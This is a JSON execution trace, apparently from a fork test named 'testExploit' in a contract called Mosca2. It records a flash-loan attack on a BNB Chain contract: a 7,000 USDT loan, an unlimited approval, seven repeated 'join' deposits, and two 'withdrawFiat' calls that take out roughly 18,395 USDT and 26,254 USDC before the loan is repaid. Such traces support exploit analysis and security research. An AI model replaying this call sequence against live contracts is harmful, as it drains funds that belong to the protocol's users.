{
  "logs": {
    "calls": [
      {
        "id": "812733",
        "contract": "Mosca2",
        "function": "testExploit",
        "args": "",
        "return_value": "Returned",
        "depth": 0,
        "internal_calls": [
          {
            "id": "10328",
            "contract": "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
            "function": "symbol",
            "args": "",
            "return_value": "\"USDC\"",
            "depth": 1,
            "internal_calls": [
              {
                "id": "3082",
                "contract": "0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C",
                "function": "symbol",
                "args": "",
                "return_value": "\"USDC\"",
                "depth": 2,
                "internal_calls": []
              }
            ],
            "value": null
          },
          {
            "id": "3296",
            "contract": "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
            "function": "balanceOf",
            "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
            "return_value": "0",
            "depth": 1,
            "internal_calls": [
              {
                "id": "2553",
                "contract": "0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C",
                "function": "balanceOf",
                "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
                "return_value": "0",
                "depth": 2,
                "internal_calls": []
              }
            ],
            "value": null
          },
          {
            "id": "3076",
            "contract": "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
            "function": "decimals",
            "args": "",
            "return_value": "18",
            "depth": 1,
            "internal_calls": [
              {
                "id": "2336",
                "contract": "0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C",
                "function": "decimals",
                "args": "",
                "return_value": "18",
                "depth": 2,
                "internal_calls": []
              }
            ],
            "value": null
          },
          {
            "id": "754645",
            "contract": "0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476",
            "function": "flashLoan",
            "args": "0, 7000000000000000000000 [7e21], Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000063078646561640000000000000000000000000000000000000000000000000000",
            "return_value": "Returned",
            "depth": 1,
            "internal_calls": [
              {
                "id": "751934",
                "contract": "0x85351262f7474Ebe23FfAcD633cf20A491F1325D",
                "function": "flashLoan",
                "args": "0, 7000000000000000000000 [7e21], Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000063078646561640000000000000000000000000000000000000000000000000000",
                "return_value": "Returned",
                "depth": 2,
                "internal_calls": [
                  {
                    "id": "12871",
                    "contract": "0x55d398326f99059fF775485246999027B3197955",
                    "function": "transfer",
                    "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 7000000000000000000000 [7e21]",
                    "return_value": "true",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "710128",
                    "contract": "Mosca2",
                    "function": "DPPFlashLoanCall",
                    "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 7000000000000000000000 [7e21], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000063078646561640000000000000000000000000000000000000000000000000000",
                    "return_value": "Returned",
                    "depth": 3,
                    "internal_calls": [
                      {
                        "id": "24562",
                        "contract": "0x55d398326f99059fF775485246999027B3197955",
                        "function": "approve",
                        "args": "0xd8791F0C10B831B605C5D48959EB763B266940B9, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
                        "return_value": "true",
                        "depth": 4,
                        "internal_calls": []
                      },
                      {
                        "id": "25308",
                        "contract": "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
                        "function": "approve",
                        "args": "0xd8791F0C10B831B605C5D48959EB763B266940B9, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
                        "return_value": "true",
                        "depth": 4,
                        "internal_calls": [
                          {
                            "id": "24562",
                            "contract": "0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C",
                            "function": "approve",
                            "args": "0xd8791F0C10B831B605C5D48959EB763B266940B9, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
                            "return_value": "true",
                            "depth": 5,
                            "internal_calls": []
                          }
                        ]
                      },
                      {
                        "id": "271915",
                        "contract": "0xd8791F0C10B831B605C5D48959EB763B266940B9",
                        "function": "join",
                        "args": "1000000000000000000000 [1e21], 0, 1, false",
                        "return_value": "Returned",
                        "depth": 4,
                        "internal_calls": [
                          {
                            "id": "10834",
                            "contract": "0x55d398326f99059fF775485246999027B3197955",
                            "function": "transferFrom",
                            "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xd8791F0C10B831B605C5D48959EB763B266940B9, 991000000000000000000 [9.91e20]",
                            "return_value": "true",
                            "depth": 5,
                            "internal_calls": []
                          },
                          {
                            "id": "10834",
                            "contract": "0x55d398326f99059fF775485246999027B3197955",
                            "function": "transferFrom",
                            "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xD7CFeEDBB70463F66b3fA1449812A162A53586C5, 9000000000000000000 [9e18]",
                            "return_value": "true",
                            "depth": 5,
                            "internal_calls": []
                          }
                        ]
                      },
                      {
                        "id": "51512",
                        "contract": "0xd8791F0C10B831B605C5D48959EB763B266940B9",
                        "function": "join",
                        "args": "1000000000000000000000 [1e21], 0, 1, false",
                        "return_value": "Returned",
                        "depth": 4,
                        "internal_calls": [
                          {
                            "id": "6034",
                            "contract": "0x55d398326f99059fF775485246999027B3197955",
                            "function": "transferFrom",
                            "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xd8791F0C10B831B605C5D48959EB763B266940B9, 991000000000000000000 [9.91e20]",
                            "return_value": "true",
                            "depth": 5,
                            "internal_calls": []
                          },
                          {
                            "id": "6034",
                            "contract": "0x55d398326f99059fF775485246999027B3197955",
                            "function": "transferFrom",
                            "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xD7CFeEDBB70463F66b3fA1449812A162A53586C5, 9000000000000000000 [9e18]",
                            "return_value": "true",
                            "depth": 5,
                            "internal_calls": []
                          }
                        ]
                      },
                      {
                        "id": "51512",
                        "contract": "0xd8791F0C10B831B605C5D48959EB763B266940B9",
                        "function": "join",
                        "args": "1000000000000000000000 [1e21], 0, 1, false",
                        "return_value": "Returned",
                        "depth": 4,
                        "internal_calls": [
                          {
                            "id": "6034",
                            "contract": "0x55d398326f99059fF775485246999027B3197955",
                            "function": "transferFrom",
                            "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xd8791F0C10B831B605C5D48959EB763B266940B9, 991000000000000000000 [9.91e20]",
                            "return_value": "true",
                            "depth": 5,
                            "internal_calls": []
                          },
                          {
                            "id": "6034",
                            "contract": "0x55d398326f99059fF775485246999027B3197955",
                            "function": "transferFrom",
                            "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xD7CFeEDBB70463F66b3fA1449812A162A53586C5, 9000000000000000000 [9e18]",
                            "return_value": "true",
                            "depth": 5,
                            "internal_calls": []
                          }
                        ]
                      },
                      {
                        "id": "51512",
                        "contract": "0xd8791F0C10B831B605C5D48959EB763B266940B9",
                        "function": "join",
                        "args": "1000000000000000000000 [1e21], 0, 1, false",
                        "return_value": "Returned",
                        "depth": 4,
                        "internal_calls": [
                          {
                            "id": "6034",
                            "contract": "0x55d398326f99059fF775485246999027B3197955",
                            "function": "transferFrom",
                            "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xd8791F0C10B831B605C5D48959EB763B266940B9, 991000000000000000000 [9.91e20]",
                            "return_value": "true",
                            "depth": 5,
                            "internal_calls": []
                          },
                          {
                            "id": "6034",
                            "contract": "0x55d398326f99059fF775485246999027B3197955",
                            "function": "transferFrom",
                            "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xD7CFeEDBB70463F66b3fA1449812A162A53586C5, 9000000000000000000 [9e18]",
                            "return_value": "true",
                            "depth": 5,
                            "internal_calls": []
                          }
                        ]
                      },
                      {
                        "id": "51512",
                        "contract": "0xd8791F0C10B831B605C5D48959EB763B266940B9",
                        "function": "join",
                        "args": "1000000000000000000000 [1e21], 0, 1, false",
                        "return_value": "Returned",
                        "depth": 4,
                        "internal_calls": [
                          {
                            "id": "6034",
                            "contract": "0x55d398326f99059fF775485246999027B3197955",
                            "function": "transferFrom",
                            "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xd8791F0C10B831B605C5D48959EB763B266940B9, 991000000000000000000 [9.91e20]",
                            "return_value": "true",
                            "depth": 5,
                            "internal_calls": []
                          },
                          {
                            "id": "6034",
                            "contract": "0x55d398326f99059fF775485246999027B3197955",
                            "function": "transferFrom",
                            "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xD7CFeEDBB70463F66b3fA1449812A162A53586C5, 9000000000000000000 [9e18]",
                            "return_value": "true",
                            "depth": 5,
                            "internal_calls": []
                          }
                        ]
                      },
                      {
                        "id": "51512",
                        "contract": "0xd8791F0C10B831B605C5D48959EB763B266940B9",
                        "function": "join",
                        "args": "1000000000000000000000 [1e21], 0, 1, false",
                        "return_value": "Returned",
                        "depth": 4,
                        "internal_calls": [
                          {
                            "id": "6034",
                            "contract": "0x55d398326f99059fF775485246999027B3197955",
                            "function": "transferFrom",
                            "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xd8791F0C10B831B605C5D48959EB763B266940B9, 991000000000000000000 [9.91e20]",
                            "return_value": "true",
                            "depth": 5,
                            "internal_calls": []
                          },
                          {
                            "id": "6034",
                            "contract": "0x55d398326f99059fF775485246999027B3197955",
                            "function": "transferFrom",
                            "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xD7CFeEDBB70463F66b3fA1449812A162A53586C5, 9000000000000000000 [9e18]",
                            "return_value": "true",
                            "depth": 5,
                            "internal_calls": []
                          }
                        ]
                      },
                      {
                        "id": "51512",
                        "contract": "0xd8791F0C10B831B605C5D48959EB763B266940B9",
                        "function": "join",
                        "args": "1000000000000000000000 [1e21], 0, 1, false",
                        "return_value": "Returned",
                        "depth": 4,
                        "internal_calls": [
                          {
                            "id": "6034",
                            "contract": "0x55d398326f99059fF775485246999027B3197955",
                            "function": "transferFrom",
                            "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xd8791F0C10B831B605C5D48959EB763B266940B9, 991000000000000000000 [9.91e20]",
                            "return_value": "true",
                            "depth": 5,
                            "internal_calls": []
                          },
                          {
                            "id": "6034",
                            "contract": "0x55d398326f99059fF775485246999027B3197955",
                            "function": "transferFrom",
                            "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xD7CFeEDBB70463F66b3fA1449812A162A53586C5, 9000000000000000000 [9e18]",
                            "return_value": "true",
                            "depth": 5,
                            "internal_calls": []
                          }
                        ]
                      },
                      {
                        "id": "19569",
                        "contract": "0xd8791F0C10B831B605C5D48959EB763B266940B9",
                        "function": "withdrawFiat",
                        "args": "18671180855284200248407 [1.867e22], false, 1",
                        "return_value": "Returned",
                        "depth": 4,
                        "internal_calls": [
                          {
                            "id": "6071",
                            "contract": "0x55d398326f99059fF775485246999027B3197955",
                            "function": "transfer",
                            "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 18395252074171625860499 [1.839e22]",
                            "return_value": "true",
                            "depth": 5,
                            "internal_calls": []
                          }
                        ]
                      },
                      {
                        "id": "42248",
                        "contract": "0xd8791F0C10B831B605C5D48959EB763B266940B9",
                        "function": "withdrawFiat",
                        "args": "26648013000000000000000 [2.664e22], false, 0",
                        "return_value": "Returned",
                        "depth": 4,
                        "internal_calls": [
                          {
                            "id": "28739",
                            "contract": "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
                            "function": "transfer",
                            "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 26254200000000000000000 [2.625e22]",
                            "return_value": "true",
                            "depth": 5,
                            "internal_calls": [
                              {
                                "id": "27993",
                                "contract": "0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C",
                                "function": "transfer",
                                "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 26254200000000000000000 [2.625e22]",
                                "return_value": "true",
                                "depth": 6,
                                "internal_calls": []
                              }
                            ]
                          }
                        ]
                      },
                      {
                        "id": "3271",
                        "contract": "0x55d398326f99059fF775485246999027B3197955",
                        "function": "transfer",
                        "args": "0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476, 7000000000000000000000 [7e21]",
                        "return_value": "true",
                        "depth": 4,
                        "internal_calls": []
                      }
                    ]
                  },
                  {
                    "id": "2534",
                    "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
                    "function": "balanceOf",
                    "args": "0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476",
                    "return_value": "242321616220426827935 [2.423e20]",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "531",
                    "contract": "0x55d398326f99059fF775485246999027B3197955",
                    "function": "balanceOf",
                    "args": "0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476",
                    "return_value": "252768744407906267874861 [2.527e23]",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "534",
                    "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
                    "function": "balanceOf",
                    "args": "0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476",
                    "return_value": "242321616220426827935 [2.423e20]",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "531",
                    "contract": "0x55d398326f99059fF775485246999027B3197955",
                    "function": "balanceOf",
                    "args": "0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476",
                    "return_value": "252768744407906267874861 [2.527e23]",
                    "depth": 3,
                    "internal_calls": []
                  }
                ]
              }
            ],
            "value": null
          },
          {
            "id": "1828",
            "contract": "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
            "function": "symbol",
            "args": "",
            "return_value": "\"USDC\"",
            "depth": 1,
            "internal_calls": [
              {
                "id": "1082",
                "contract": "0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C",
                "function": "symbol",
                "args": "",
                "return_value": "\"USDC\"",
                "depth": 2,
                "internal_calls": []
              }
            ],
            "value": null
          },
          {
            "id": "1296",
            "contract": "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
            "function": "balanceOf",
            "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
            "return_value": "26254200000000000000000 [2.625e22]",
            "depth": 1,
            "internal_calls": [
              {
                "id": "553",
                "contract": "0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C",
                "function": "balanceOf",
                "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
                "return_value": "26254200000000000000000 [2.625e22]",
                "depth": 2,
                "internal_calls": []
              }
            ],
            "value": null
          },
          {
            "id": "1076",
            "contract": "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
            "function": "decimals",
            "args": "",
            "return_value": "18",
            "depth": 1,
            "internal_calls": [
              {
                "id": "336",
                "contract": "0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C",
                "function": "decimals",
                "args": "",
                "return_value": "18",
                "depth": 2,
                "internal_calls": []
              }
            ],
            "value": null
          }
        ],
        "value": null
      }
    ]
  }
}